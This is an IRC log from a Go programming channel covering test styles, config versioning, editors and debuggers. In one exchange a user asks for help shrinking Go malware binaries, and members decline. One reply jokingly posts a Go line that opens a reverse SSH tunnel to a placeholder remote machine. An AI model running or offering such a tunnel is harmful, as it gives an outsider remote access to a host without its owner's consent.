[19:08:09] *** Quits: shka (~herr@109.231.62.239) (Read error: Connection reset by peer)
[19:10:36] *** Quits: Xjs (~jannis@user/xjs) (Ping timeout: 265 seconds)
[19:12:05] *** Quits: mmfood (~mmfood@45.135.187.117) (Ping timeout: 252 seconds)
[19:16:22] *** Joins: Xjs (~jannis@user/xjs)
[19:18:41] *** Quits: jannis (~jannis@user/xjs) (Ping timeout: 252 seconds)
[19:21:31] *** Quits: be3uykpy (~be3uykpy@141.226.9.247) (Quit: Leaving)
[19:24:07] *** Joins: Doc_X (~Doc_X@186.219.232.35.bc.googleusercontent.com)
[19:25:27] *** Quits: eck0__ (~Android@mobile-166-173-63-19.mycingular.net) (Read error: Connection reset by peer)
[19:25:49] *** Joins: eck0 (~Android@047-007-119-133.res.spectrum.com)
[19:27:02] *** Joins: dyslexicat (~dyslexica@212.253.59.190)
[19:31:08] *** Joins: bodhi (~bodhi@c-73-93-87-220.hsd1.ca.comcast.net)
[19:31:15] *** Quits: dyslexicat (~dyslexica@212.253.59.190) (Ping timeout: 252 seconds)
[19:32:27] *** Joins: Guest4451 (~Guest44@c-73-93-87-220.hsd1.ca.comcast.net)
[19:34:02] *** Parts: Guest4451 (~Guest44@c-73-93-87-220.hsd1.ca.comcast.net) ()
[19:35:05] *** Quits: fef (~thedawn@user/thedawn) (Remote host closed the connection)
[19:35:25] *** Joins: templ1 (~Guest44@c-73-93-87-220.hsd1.ca.comcast.net)
[19:37:23] *** Quits: ausserz (~ausserz@n219073000163.netvigator.com) (Read error: Connection reset by peer)
[19:41:38] *** Parts: bodhi (~bodhi@c-73-93-87-220.hsd1.ca.comcast.net) ()
[19:41:42] *** Joins: hrnz (~ulli@irc.plumbing)
[19:44:33] *** Quits: Xjs (~jannis@user/xjs) (Ping timeout: 272 seconds)
[19:48:12] *** Joins: Xjs (~jannis@user/xjs)
[19:49:32] *** Joins: icholy (~icholy@68.71.18.45)
[19:50:51] *** Joins: avery_ (~avery@198.232.126.197)
[19:51:24] *** Parts: avery_ (~avery@198.232.126.197) ()
[19:52:55] *** Joins: fef (~thedawn@user/thedawn)
[19:53:25] <Tv_> thinkofher: i've largely switched from table tests to subtests. `run("name", put, inputs, etc, here)` and just lines of that, makes it very easy to run e.g. just one test, can parallelize test runs, etc
[19:53:53] <Tv_> `run := func(name string, etc) { t.Run(name, ...
[19:54:44] *** Quits: templ1 (~Guest44@c-73-93-87-220.hsd1.ca.comcast.net) (Quit: Client closed)
[19:55:50] <thinkofher> Tv_: we can still call it table testes I think
[19:55:57] <thinkofher> it's jut another implementation
[19:55:59] <thinkofher> but it's cool
[19:56:10] <thinkofher> i might try it another time
[19:56:13] <icholy> I use table tests + subtests
[19:56:22] <Tv_> people searching for "table tests" won't find that implementation
[19:56:36] <Tv_> they're called subtests by the testing framework, so i call them subtest
[19:56:39] <Tv_> +s
[19:56:52] <icholy> t.Run(...) insite the table test loop
[19:56:53] <thinkofher> by table test i understand: one scenario with different data
[19:57:01] <Tv_> table tests were a kludge that was needed before subtests existed
[19:57:13] <thinkofher> when i am running testes with type test struct{} i am also running subtestes
[19:57:15] <thinkofher> by calling
[19:57:22] *** Joins: edrocks (~Ed@user/edrocks)
[19:57:29] <thinkofher> t.Run(tt.name, func(t *testing.T) {})
[19:57:36] <Tv_> icholy: i find the run helper thing to be more ergonomic so far
[19:58:08] <thinkofher> icholy: it's common scenario :D
[19:58:22] <thinkofher> but Tv_ approach is very interesting too
[19:58:56] <Tv_> icholy: i also have plenty where they don't use the exact same underlying test code, but slight variations of it, and the run trick works great there too
[19:59:48] <Tv_> and i often derive the test name from the primary input, e.g. stringifying an integer
[20:00:04] *** Quits: KekSi (~KekSi@x4dbe92c4.dyn.telefonica.de) (Quit: *.net *.split)
[20:00:40] <Tv_> so often it looks more like `run("some input", 7); run("another input", 11)`
[20:00:57] <Tv_> or same with struct literals, etc
[20:02:01] <icholy> the two approaches look very similar to me
[20:02:13] <icholy> but I think the table tests asthetically
[20:02:22] <icholy> I think I prefer*
[20:02:58] *** Joins: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25)
[20:04:11] <icholy> in the case that the tests slightly vary I've added a func field to the test case which has additional logic. I think the run style would be cleaner there.
[20:04:16] <thinkofher> the one problem I can see with Tv_ approach is when you have a lot of arguments
[20:04:55] <Tv_> just don't use functions with a lot of arguments, test or not
[20:05:02] <Tv_> you can always slap a struct there
[20:05:11] <thinkofher> i am doing very strong dependency injection in my current main project, so i have like: 6, 7 fields in my single table test
[20:05:15] <siXy> thinkofher: When doing that style I would typically have, e.g. inputs struct { thing1, thing2, thing3} so your arg list is small, but you can pass as much as you need
[20:05:34] *** Joins: bodhi1 (~bodhi@c-73-93-87-220.hsd1.ca.comcast.net)
[20:05:45] <bodhi1> hello
[20:06:04] <bodhi1> screwed up the bodhi alias ... will reregister tomorrow
[20:06:11] <bodhi1> are all my fav gophers here :-)
[20:06:24] <thinkofher> siXy: and your `run(...)` tests slowly transforms into regular `for _, tt := range tests` table tests
[20:06:43] <Tv_> thinkofher: huh?
[20:07:09] <thinkofher> when you're using struct literal as argument for big `run(...)` test
[20:07:10] *** Quits: Xjs (~jannis@user/xjs) (Quit: Good night.)
[20:07:22] <Tv_> just because you group function arguments into a struct (so the names are more visible) doesn't transform anything into a loop
[20:07:28] <thinkofher> it starts looking very familiar to table tests with for loop and subtest function
[20:08:09] <bodhi1> yes they are.... hello Tv_ siXy b0nn :-)
[20:08:22] <Tv_> also, those kinds of things tend to be more like configuration than input, and they group nicely, and the run helper trick is better at that than tables ;)
[20:09:09] <bodhi1> how do you version config files in golang. I have a cli and I want to version it and then be able to recognize the version. Is there a canonical way to implement it?
[20:09:13] <thinkofher> ok i will certainly try this approeach one day, because i am interested how it will affect my unit test workflow
[20:09:19] *** Parts: Trancer (trancer@user/trancer) ()
[20:09:36] <thinkofher> Tv_: are you running t.Run inside your `run(...)` function
[20:09:40] <Tv_> yes
[20:12:32] *** Joins: SebastianM (~seba@user/sebastianm)
[20:12:32] *** Quits: SebastianM (~seba@user/sebastianm) (Client Quit)
[20:12:45] <Tv_> the point of the run helper is just to make the calls to t.Run more pleasant to write
[20:18:03] *** Joins: CookE[] (~thedawn@user/thedawn)
[20:18:42] *** Quits: mikoto-chan (~mikoto-ch@ip-213-49-189-31.dsl.scarlet.be) (Ping timeout: 272 seconds)
[20:19:52] *** Quits: parnikkapore (~parnikkap@user/parnikkapore) (Quit: Leaving)
[20:19:58] *** Quits: acidfu (~nicolasbo@2605:8d80:5e0:9183:4161:760e:1b80:bbdb) (Read error: Connection reset by peer)
[20:20:13] <Garb0> They were right, Go does indeed create some thicc stuff.
[20:20:44] *** Quits: prout (~prout@user/prout) (Quit: prout.)
[20:20:47] <Garb0> i need to learn how to slim down go bins, any pointers?
[20:21:02] *** Joins: Kane (~Kane@2a01:e34:ee89:5d90:91eb:49c0:e1ba:dea9)
[20:21:40] *** Quits: fef (~thedawn@user/thedawn) (Ping timeout: 252 seconds)
[20:21:53] <edrocks> Garb0 you can strip some debug info out which is a large majority. Go doesn't exactly excel at small binaries out of the box but it's a non issue in most server contexts
[20:22:38] *** Joins: fef (~thedawn@user/thedawn)
[20:23:45] <Garb0> with ldflags -s -w it went down from 2.9 to 2, massive improvement
[20:23:45] <Tv_> i think that's a futile fight and you should investigate why you think slimming something from  30MB to 5MB is a meaningful change...
[20:23:51] <Garb0> let's dig deeper
[20:24:12] <Garb0> Tv_: experimenting with go malware
[20:24:16] <Tv_> please don't
[20:24:25] *** Quits: CookE[] (~thedawn@user/thedawn) (Ping timeout: 252 seconds)
[20:24:27] <Garb0> hm?
[20:25:13] *** Quits: edrocks (~Ed@user/edrocks) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[20:25:13] <Tv_> the world doesn't need more grifters; write something useful
[20:26:27] <siXy> Not to mention that these days, it'll make you unemployable when you're caught. The days of people hiring malware authors are long gone.
[20:27:10] *** Quits: fef (~thedawn@user/thedawn) (Ping timeout: 252 seconds)
[20:27:33] <endigma> os.Exec("ssh -fN -R 7000:localhost:22 username@yourMachine-ipaddress")
[20:27:36] <endigma> ooga booga malware
[20:27:59] *** Joins: domino14 (~domino14@pool-98-109-54-103.nwrknj.fios.verizon.net)
[20:28:19] <Garb0> Tv_, siXy, educational purposes.
[20:28:22] *** Joins: src (~src@user/src)
[20:28:27] <Tv_> then size won't matter ;)
[20:29:12] <Garb0> Kinda does, i'm trying to figure out the most efficient language for this stuff, balancing between performance and dev quality of life
[20:29:30] <Tv_> so not educational purpose then
[20:29:38] <Garb0> all for a uni write up.
[20:29:38] <endigma> why would your malware's performance matter
[20:29:48] <Garb0> Why would it not?
[20:29:59] <endigma> provided you're only using it for testing
[20:30:18] <endigma> and the reason malware is written in go isn't because of anything language related
[20:30:25] <siXy> Why would you assume that anyone would want to teach you how to write better malware?
[20:30:26] <Tv_> "injecting" a 30MB binary vs 5MB binary is gonna perform practically the same in any educational situation
[20:30:28] <endigma> its because of cross compilation and odd go binary structure
[20:30:38] <Tv_> and also what university is this so i put them on my shitlist
[20:31:03] <Tv_> because there's so much better stuff a university should be teaching you
[20:31:07] <Garb0> siXy: just asking how to slim down a bin tbh
[20:31:09] <endigma> white hat hacking is an idea from days gone by
[20:31:13] *** Quits: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[20:31:17] <icholy> Garb0: I hear vlang is a great fit https://vlang.io/
[20:31:20] <endigma> now you just get put on corporate shit lists
[20:31:28] <Tv_> endigma: and has nothing to do with squeezing an exploit into a smaller size
[20:31:34] <Tv_> icholy: oooh
[20:31:58] *** Joins: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr)
[20:32:08] <bodhi1> any recommendations people?
[20:32:25] <bodhi1> I can try to study another project to implement it too :-)
[20:32:25] <Tv_> bodhi1: put the version as an item inside the config file?
[20:33:02] *** Quits: Kane (~Kane@2a01:e34:ee89:5d90:91eb:49c0:e1ba:dea9) (Read error: Connection reset by peer)
[20:33:02] <bodhi1> Tv_: yes. wont the struct keep changing? how to be able to support multiple versions?
[20:33:09] *** Joins: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com)
[20:33:23] <Tv_> bodhi1: you either make backwards-compatible changes, or you use multiple structs
[20:33:24] <icholy> bodhi1: version inside the config file, parse it once only for the version. Then parse again into the correct struct based on the version.
[20:34:02] <Tv_> bodhi1: realistically, both; backwards-compat when you can, multiple structs when you can't
[20:34:31] <bodhi1> put the structs in different packages?
[20:35:09] *** Joins: Kane (~Kane@2a01:e34:ee89:5d90:ed84:fad8:49a1:17af)
[20:35:11] <Tv_> why would you do that
[20:35:25] <icholy> bodhi1: I'd keep them in the same package. And write a helper that converts the old config struct to the new one.
[20:35:27] <bodhi1> oh i mean v1 and v2 package?
[20:36:19] *** Joins: Jazon (~Jazon@user/jazon)
[20:36:28] <bodhi1> ok icholy
[20:39:49] *** Joins: dyslexicat (~dyslexica@212.253.59.190)
[20:43:02] *** Quits: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[20:43:49] *** Quits: dyslexicat (~dyslexica@212.253.59.190) (Ping timeout: 245 seconds)
[20:45:08] *** Quits: krthnz (~quassel@dslb-188-109-141-016.188.109.pools.vodafone-ip.de) (Quit: krthnz)
[20:51:22] *** Joins: SebastianM (~seba@user/sebastianm)
[20:51:30] *** Quits: SebastianM (~seba@user/sebastianm) (Client Quit)
[20:53:18] *** Joins: cfebs_ (~cfebs@user/cfebs)
[20:53:39] *** Joins: kshockey (~kyshoc@adsl-99-93-208-248.dsl.mtry01.sbcglobal.net)
[20:53:39] *** Quits: kshockey (~kyshoc@adsl-99-93-208-248.dsl.mtry01.sbcglobal.net) (Changing host)
[20:53:39] *** Joins: kshockey (~kyshoc@user/kyshoc)
[20:53:56] *** Joins: tdmackey (~tdmackey@booleanhaiku.com)
[20:54:24] *** Joins: cmagina_ (~cmagina@user/cmagina)
[20:54:52] *** Joins: eldritch__ (~eldritch@134.209.221.71)
[20:55:52] *** Joins: cultpony_ (~cultpony@user/cultpony)
[20:55:56] *** Joins: KirkMcDo1ald (~Kirk@python/site-packages/KirkMcDonald)
[20:56:06] *** Joins: AquaL1te_ (~AquaL1te@user/aqual1te)
[20:56:06] *** Joins: doghackit1 (~doghackit@c-76-27-57-63.hsd1.ut.comcast.net)
[20:56:08] *** Joins: belak51 (~belak@66.175.222.59)
[20:56:18] *** Joins: CorbaThe1eek (~peter@99-167-204-9.lightspeed.sntcca.sbcglobal.net)
[20:56:24] *** Joins: hendry1 (~hendry@210.23.22.2)
[20:56:25] *** Joins: PedroG2 (~android@45.77.216.181)
[20:56:27] *** Joins: jybs_ (~james@110-175-225-162.static.tpgi.com.au)
[20:56:52] *** Joins: purpleid1a (~james@user/purpleidea)
[20:56:52] *** Joins: mikeputnam1 (~mikeputna@wilug/mikeputnam)
[20:56:55] *** Joins: mrig_ (~mrig@user/mrig)
[20:56:58] *** Joins: kaivo (~Kaivo@user/kaivo)
[20:57:16] *** Joins: xavpaice (~quassel@103-96-86-209.novaconnect.nz)
[20:57:29] *** Joins: krthnz (~quassel@dslb-188-109-141-016.188.109.pools.vodafone-ip.de)
[20:57:32] *** Quits: domino14 (~domino14@pool-98-109-54-103.nwrknj.fios.verizon.net) (Remote host closed the connection)
[20:58:23] *** Quits: crowbar (~user@user/crowbar) (Killed (mercury.libera.chat (Nickname regained by services)))
[21:00:17] *** Quits: yoonkn (~user@175.197.208.79) (Read error: Connection reset by peer)
[21:00:49] *** Joins: crowbar (~user@user/crowbar)
[21:00:58] *** Joins: absc1 (~absc@dynamic-adsl-94-34-175-4.clienti.tiscali.it)
[21:01:00] *** Quits: arcatech (~arcatech@user/arcatech) (*.net *.split)
[21:01:00] *** Quits: farmstatejake (~farmstate@user/farmstatejake) (*.net *.split)
[21:01:00] *** Quits: meain (~meain@2001:470:69fc:105::2db) (*.net *.split)
[21:01:00] *** Quits: jai (~darkapex@user/darkapex) (*.net *.split)
[21:01:00] *** Quits: kadoban (~kadoban@user/kadoban) (*.net *.split)
[21:01:00] *** Quits: absc (~absc@dynamic-adsl-94-34-175-4.clienti.tiscali.it) (*.net *.split)
[21:01:00] *** Quits: mrig (~mrig@user/mrig) (*.net *.split)
[21:01:00] *** Quits: yelnah (~felix@2001:44b8:3084:400:6f0:21ff:fe3c:d4d7) (*.net *.split)
[21:01:00] *** Quits: gildarts (16abab341f@user/gildarts) (*.net *.split)
[21:01:00] *** Quits: habys (~habys@2603:3001:bd9:f1:1337:f1ac:d00d:17c) (*.net *.split)
[21:01:00] *** Quits: PedroG1 (~android@45.77.216.181) (*.net *.split)
[21:01:00] *** Quits: egy (egy@tilde.team) (*.net *.split)
[21:01:00] *** Quits: purpleidea (~james@user/purpleidea) (*.net *.split)
[21:01:00] *** Quits: kyshoc (~kyshoc@user/kyshoc) (*.net *.split)
[21:01:00] *** Quits: hendry (~hendry@210.23.22.2) (*.net *.split)
[21:01:00] *** Quits: chemsmith (~chemsmith@user/chemsmith) (*.net *.split)
[21:01:00] *** Quits: mikeputnam (~mikeputna@wilug/mikeputnam) (*.net *.split)
[21:01:00] *** Quits: xav (~quassel@103-96-86-209.novaconnect.nz) (*.net *.split)
[21:01:00] *** Quits: DogHackit (~doghackit@c-76-27-57-63.hsd1.ut.comcast.net) (*.net *.split)
[21:01:00] *** Quits: R2robot (~R2robot@user/r2robot) (*.net *.split)
[21:01:00] *** Quits: cmagina (~cmagina@user/cmagina) (*.net *.split)
[21:01:00] *** Quits: LambdaComplex (~adam@wireguard/tunneler/lambdacomplex) (*.net *.split)
[21:01:00] *** Quits: cfebs (~cfebs@user/cfebs) (*.net *.split)
[21:01:00] *** Quits: belak (~belak@user/belak) (*.net *.split)
[21:01:00] *** Quits: tdmackey_ (~tdmackey@booleanhaiku.com) (*.net *.split)
[21:01:00] *** Quits: Kaivo_ (~Kaivo@user/kaivo) (*.net *.split)
[21:01:00] *** Quits: CorbaTheGeek (~peter@99-167-204-9.lightspeed.sntcca.sbcglobal.net) (*.net *.split)
[21:01:00] *** Quits: DaftMonk (sid201914@user/daftmonk) (*.net *.split)
[21:01:00] *** Quits: AquaL1te (~AquaL1te@user/aqual1te) (*.net *.split)
[21:01:00] *** Quits: eldritch_ (~eldritch@134.209.221.71) (*.net *.split)
[21:01:00] *** Quits: jybs (~james@110-175-225-162.static.tpgi.com.au) (*.net *.split)
[21:01:00] *** Quits: cultpony (~cultpony@user/cultpony) (*.net *.split)
[21:01:00] *** Quits: KirkMcDonald (~Kirk@python/site-packages/KirkMcDonald) (*.net *.split)
[21:01:03] *** cultpony_ is now known as cultpony
[21:01:03] *** cmagina_ is now known as cmagina
[21:01:30] *** Quits: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25) (Remote host closed the connection)
[21:01:55] *** Joins: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25)
[21:02:55] *** Quits: Garb0 (~Garb0@user/garb0) (Quit: Garb0)
[21:03:22] *** Joins: pepee (~user@user/pepee)
[21:04:39] *** Quits: whaley (~whaley@066-169-090-170.res.spectrum.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[21:06:20] *** Quits: Torr (~Torr@170.83.146.97) (Ping timeout: 264 seconds)
[21:07:29] *** Quits: krthnz (~quassel@dslb-188-109-141-016.188.109.pools.vodafone-ip.de) (Quit: krthnz)
[21:07:45] *** Joins: spencer (~s@2600:1700:1739:4000:ec3a:6570:50cc:2d8d)
[21:08:02] *** Joins: LambdaComplex (~adam@wireguard/tunneler/lambdacomplex)
[21:08:24] *** Joins: chemsmith (~chemsmith@user/chemsmith)
[21:14:20] *** Joins: krthnz (~quassel@dslb-188-109-141-016.188.109.pools.vodafone-ip.de)
[21:14:26] *** Quits: krthnz (~quassel@dslb-188-109-141-016.188.109.pools.vodafone-ip.de) (Client Quit)
[21:14:47] *** Joins: edrocks (~Ed@user/edrocks)
[21:19:22] *** Joins: fef (~thedawn@user/thedawn)
[21:20:22] *** Joins: pupiw (~pupiw@2600:8801:f10c:7b00:fd85:2d29:6287:72b7)
[21:20:42] *** Joins: gildarts (16abab341f@user/gildarts)
[21:20:45] *** Joins: yelnah (~felix@2001:44b8:3084:400:6f0:21ff:fe3c:d4d7)
[21:20:51] *** Joins: DaftMonk (sid201914@user/daftmonk)
[21:20:57] *** Joins: habys (~habys@2603:3001:bd9:f1:1337:f1ac:d00d:17c)
[21:20:59] *** Joins: farmstatejake (~farmstate@user/farmstatejake)
[21:21:06] *** Joins: R2robot (~R2robot@user/r2robot)
[21:21:08] *** Joins: egy (egy@tilde.team)
[21:21:19] *** Quits: spencer (~s@2600:1700:1739:4000:ec3a:6570:50cc:2d8d) (Quit: Textual IRC Client: www.textualapp.com)
[21:24:09] *** Joins: mikoto-chan (~mikoto-ch@ip-213-49-189-31.dsl.scarlet.be)
[21:24:19] *** Quits: davidkrauser (~davidkrau@user/davidkrauser) (Quit: Leaving)
[21:25:39] *** Quits: tedwing (~anon@lfbn-idf3-1-1409-99.w109-221.abo.wanadoo.fr) (Ping timeout: 252 seconds)
[21:25:58] <src> endigma: based on our discussion earlier, maybe if I have the time (and do it out of fun, not out of false hope of super increased producitivty) I will fine tune something like vim to work perfectly with Go, and use it in parallel to vscode whenever my setup can't handle it without much additional configuration etc
[21:26:08] *** Joins: arcatech (~arcatech@user/arcatech)
[21:27:05] <edrocks> are there any logs for libera? There use to be botbot on the old server
[21:27:18] <endigma> run a bouncer
[21:28:10] <siXy> Or just enable logs in your client. Sam was talking about maybe linking up the XMPP thing and logging both together, but I don't think that got anywhere further than "It might be nice if..."
[21:28:17] <endigma> edrocks: https://haste.cya.cx/honujiwamo.txt if you're interested in the conversation
[21:28:28] <edrocks> endigma thank oyu!
[21:28:55] <Tv_> edrocks: the people running the public log bots tend to stop volunteering that service after a while, that's what happened even on freenode before the move
[21:29:15] <gilesc> src: It would really depend on your workflow. Most engineers that i've worked with woudl look at my setup and ask how in the world I could be productive at it... (i just use a text editor and external tools like compiler and such)
[21:29:18] *** Parts: Jazon (~Jazon@user/jazon) (Textual IRC Client: www.textualapp.com)
[21:29:20] <endigma> just host something like thelounge for yourself
[21:29:23] *** Joins: dyslexicat (~dyslexica@212.253.59.190)
[21:29:29] <endigma> ezpz web client & bouncer
[21:29:31] <gilesc> if you're trying to turn VIM into something its not... i wouldn't really do that. I"d learn modal editing and then add it to VSCode.
[21:29:32] <src> I was thinking about running a bouncer, but I actually like the mechanism of either being online or not, it's fine
[21:29:55] <endigma> vscode has a pretty competent vim addon
[21:29:59] <endigma> there's also OniVim
[21:30:03] <endigma> if that's anywhere near complete
[21:30:20] <edrocks> Tv_ yea, I've noticed that over the years they kept shutting off. I probably need to setup a bouncer I've just never taken the time too
[21:30:25] <src> yes I've seen onivim, seems interesting, but I would probably just use neovim
[21:30:31] *** Joins: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr)
[21:30:48] <endigma> onivim isn't really like neovim
[21:30:54] <endigma> it uses vscode packages
[21:31:00] *** Joins: kadoban (~kadoban@user/kadoban)
[21:31:11] <src> gilesc: I've seen a video about Clion and was absolutely shocked, like "that is programming?", right click and paste ready made functions and whatnot, really weird :P
[21:31:13] <endigma> iirc their goal is a proper modal editor implementation using vsix for addons
[21:31:26] <edrocks> I think vscode is supposed to have a pretty good vim mode but I haven't used it. It was in one of their big updates about a year ago
[21:31:49] <endigma> src: I really dislike block/package based coding
[21:32:10] <endigma> stuff like dotnet and clion just defeat the point of code
[21:32:15] <gilesc> I use emacs for text editing, and clion for nothing more than a debugger (mostly because I am on linux most of the time and those debuggers aren't great). So i dont really get the whole templating thing, not my workflow :)
[21:32:27] <endigma> gdb?
[21:32:28] <gilesc> but then again i do the same for go... emacs + goland for debugging
[21:32:37] <endigma> delve is fine on the cli
[21:32:43] *** Joins: acidfu (~nicolasbo@2605:8d80:5c0:2815:f5b5:5836:dcfe:53c8)
[21:32:53] <endigma> there's also uh
[21:32:55] <endigma> gdlv
[21:33:02] <icholy> I've used gdlv a lot
[21:33:06] <gilesc> i dont really like terminal based debuggers.. much rather have a dedicated workflow / watch list windows / etc
[21:33:21] <endigma> vscode has delve and gdb support i think
[21:33:23] <icholy> but I find myself using vscode for debugging more complex things
[21:33:42] <endigma> i couldn't get vscode's delve thing to work when i tried
[21:33:46] <icholy> once the dap support is solid in delve I hope someone writes a good vim plugin
[21:33:46] <endigma> kept complaining about my path
[21:33:49] *** Quits: llorllale (~llorllale@2607:9880:3a18:69:84bd:6edb:5762:9573) (Ping timeout: 268 seconds)
[21:33:57] *** Joins: Torr (~Torr@170.83.146.97)
[21:34:17] <gilesc> debugging is one of those things that i dont want to think about... i just want a tool that works.
[21:34:30] *** Quits: dyslexicat (~dyslexica@212.253.59.190) (Ping timeout: 264 seconds)
[21:34:46] <src> gilesc: seems like a good approach, when you don't need the firepower use whatever is best for you, if you have a problem that can be more quickly fixed using goland or whatnot, just use it if it's available
[21:34:50] <src> seems pragmatic
[21:35:50] <gilesc> yup, use the best tool for the job. For me, editing text... emacs and vim work great. (i never use the text editor inside intellij or vs or whatever.) Emacs and vim debugging doesn't work for me, so i turn to dedicated tools for that
[21:36:29] <endigma> i tell programmers constantly fretting over vim, neovim, emacs, vscode, atom differences to just pick one and start programming
[21:36:42] <endigma> it's like shopping for a hammer for 5 hours and never touching a nail
[21:36:49] <src> the same goes for distro hopping btw
[21:37:02] <endigma> i settled on void about a year ago
[21:37:05] <endigma> never intend to change
[21:37:17] <src> I spent so many hours years back setting up gentoo, and arch and customized system, nerding over how little RAM my system would use upon boot and crap like that
[21:37:17] <endigma> if it ain't broke don't fix it
[21:37:30] <endigma> thats what i fucking love about void it just does what it's meant to
[21:37:32] <src> if I spent all this time actually learning something about networking, or programming etc
[21:37:33] <icholy> I only look at my vim config a few times a year
[21:37:52] <endigma> i download void it installs in a few minutes and every single package works ootb unpatched
[21:38:16] <endigma> i've only ever had issues with stuff like drivers for printers and scanners and cameras
[21:38:25] <endigma> just because nobody has packaged them yet
[21:39:23] <src> tbh I just run ubuntu, even with stock UI (gnome) ... and that considering I spent years running gentoo/openbsd with tiling wms etc :P
[21:39:35] *** Joins: Garb0 (~Garb0@user/garb0)
[21:40:15] <mrig_> dlv works really nicely from the command line
[21:40:21] *** mrig_ is now known as mrig
[21:40:32] <gilesc> icholy: I've gotten it to the point where i only touch my configs when i pick up a new language. I dont use syntax hilighting or linting, i always rely on the compiler for that.
[21:40:49] <gilesc> i just need to add the appropriate ft plugin or emacs mode, and make sure my key bindings are set.. then just go
[21:41:13] <icholy> gilesc: what about go-to-definition and K to bring up docs?
[21:41:44] <icholy> gilesc: or whatever the equivalent is in emacs
[21:41:45] <src> yes that has been a killer feature for me while learning
[21:41:55] <Tv_> M-. for emacs, usually
[21:41:56] <gilesc> in emacs i have     (define-key evil-normal-state-map (kbd "C-f") 'ag-project-at-point) which searches the codebase for the thing
[21:41:58] <endigma> vscode has an addon for zeal/dash
[21:42:03] <endigma> works wonderfully
[21:42:04] <gilesc> that is usually enough for me to find what i want fairly quickly
[21:42:55] <src> don't forget C-x M-c M Butterfly
[21:43:22] <gilesc> i also don't use code completion because i find that it just distracts me with popups all the time. Liek i said, lots of engineers wonder how i can be productive with mysetup... but i found something that works for me, and i just program
[21:44:06] <icholy> gilesc: you can change the completion to not automatically trigger.
[21:44:17] <mrig> learning about the filetype and augroup and autocmd really solved most of the issues that I used to have with vim.
[21:44:26] <endigma> vscode's autocomplete is great
[21:44:30] <endigma> i turn it off by default
[21:44:31] <icholy> gilesc: go-to-definition works for dependencies and the standard library
[21:44:31] <mrig> when switching between languages.
[21:44:43] <endigma> but sometimes i wanna dig through all the fields and methods on an object
[21:44:51] <endigma> especially when learning new library
[21:45:01] <endigma> like i could go viper.<ctrl + space>
[21:45:03] <src> I have it set so it never autocompletes anything automatically
[21:45:06] <endigma> and it shows every method
[21:45:08] <gilesc> im sure it does, but... the benefits of not having it means i learn the API and when / what to use, why, etc... (again, my workflow.. works for me... doesn't work for everyone :) )
[21:45:11] <src> but shows what's available
[21:45:38] <gilesc> i'll just open the object's code in a vertical split and browse through it
[21:46:01] <gilesc> but i dont really do a lot of OOP these days, mainly more procedural style golang, some scala, etc
[21:46:38] <endigma> programmers should just program in what makes them like programming
[21:46:45] <endigma> using vim all day would drive me mad
[21:46:49] <endigma> but some people love it
[21:46:59] <gilesc> Yes endigma: there is a strong argument for "the joy of programming"
[21:47:26] <endigma> it's the same thing with linux customization, some people are content using tiling wms with nothing but keybinds
[21:47:32] <endigma> some people want kde/gnome or openbox
[21:47:57] <endigma> people should just use what makes them like using it
[21:47:57] <src> in the spirit of this discussion, time to get going, see you guys around and thanks for the discussions, enjoyed it :P
[21:48:05] <huf> a large part of growing up is no longer arguing with people about the gusty bus
[21:48:12] <huf> because that sort of thing is non est disputandum
[21:48:26] <gilesc> see ya src. Thanks for the discussion
[21:49:39] *** hendry1 is now known as hendry
[21:52:22] <mrig> De gustibus, that is quite some digest :)
[21:52:41] *** Joins: Vukan (~drazen@62.240.24.136)
[21:52:43] *** Joins: jai (~darkapex@user/darkapex)
[21:53:25] <mrig> <3 gustibus; I think I might have a new favorite word!
[21:54:59] *** Joins: krthnz (~quassel@dslb-188-109-141-016.188.109.pools.vodafone-ip.de)
[21:58:09] <Tv_> there *is* value to being exposed to very different experiences. i will never argue you should use acme as your day to day editor, but studying it will improve you as a developer.
[21:59:19] <icholy> watching "A Tour of Acme" by russ is as far as I'm willing to go.
[21:59:45] <Tv_> plumber is a lot of the underlying magic, not sure if that got covered
[21:59:54] *** Joins: hexfive (~eric@50.35.83.177)
[21:59:54] *** Quits: hexfive (~eric@50.35.83.177) (Client Quit)
[22:00:05] <icholy> doesn't ring any bells
[22:00:18] <Tv_> yeah. that's like knowing about unix but not about pipes.
[22:01:10] <Tv_> i'm no expert, but i'm always fascinated by HCI experiments
[22:03:58] *** Quits: averell- (~averell@user/averell) (Remote host closed the connection)
[22:05:02] *** Quits: gethuen (uid502979@id-502979.stonehaven.irccloud.com) (Quit: Connection closed for inactivity)
[22:05:09] *** Quits: dmathieu (~textual@pop.92-184-110-32.mobile.abo.orange.fr) (Ping timeout: 272 seconds)
[22:08:03] *** Quits: absc1 (~absc@dynamic-adsl-94-34-175-4.clienti.tiscali.it) (Remote host closed the connection)
[22:13:51] *** Quits: Vukan (~drazen@62.240.24.136) (Ping timeout: 244 seconds)
[22:14:10] *** Joins: sudoforge (~sudoforge@wireguard/tunneler/sudoforge)
[22:14:27] *** Joins: averell (~averell@user/averell)
[22:14:36] *** Quits: jcajka (~jcajka@89-24-144-111.customers.tmcz.cz) (Remote host closed the connection)
[22:16:49] *** Quits: fef (~thedawn@user/thedawn) (Remote host closed the connection)
[22:23:05] *** Quits: kwilczynski (sid379192@id-379192.highgate.irccloud.com) ()
[22:25:23] *** Quits: HeraHelix (~hederahel@2804:7f0:3988:65e9:98cc:df1f:8a6:7c25) (Ping timeout: 265 seconds)
[22:26:15] *** Quits: sord937 (~sord937@gateway/tor-sasl/sord937) (Quit: sord937)
[22:30:38] *** Joins: fef (~thedawn@user/thedawn)
[22:33:18] *** Quits: Garb0 (~Garb0@user/garb0) (Read error: Connection reset by peer)
[22:39:14] *** Joins: davidkrauser (~davidkrau@user/davidkrauser)
[22:43:43] *** Quits: andlabs (~andlabs@68.237.68.71) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[22:44:06] *** Quits: davidkrauser (~davidkrau@user/davidkrauser) (Client Quit)
